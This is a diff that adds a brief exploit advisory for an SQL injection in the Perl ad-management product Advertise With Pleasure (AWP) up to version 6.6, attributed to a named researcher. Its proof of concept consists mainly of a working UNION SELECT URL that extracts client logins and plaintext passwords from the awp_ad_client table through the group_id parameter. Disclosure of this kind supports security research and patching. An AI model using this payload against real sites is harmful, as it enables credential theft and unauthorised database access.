@@ -1,0 +1,20 @@
+# Exploit Title: Advertise With Pleasure! (AWP) <= 6.6 - SQL Injection vulnerability
+# Date: 12/02/2014
+# Author: Robert Cooper (robertc[at]areyousecure.net)
+# Software Link: http://www.guruperl.net/products/awppro/
+# Tested on: [Linux/Windows 7]
+# Vulnerable Parameter: group_id=
+ 
+##############################################################
+
+PoC:
+
+http://server/cgi/client.cgi?act=list_zone&group_id=1'
+
+http://server/cgi/client.cgi?act=list_zone&group_id=1 union all select 1,2,group_concat(id,0x3a,login,0x3a,password,0x0a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 from awp_ad_client--
+ 
+(Passwords are stored in plaintext) 
+
+##############################################################
+
+http://www.areyousecure.net
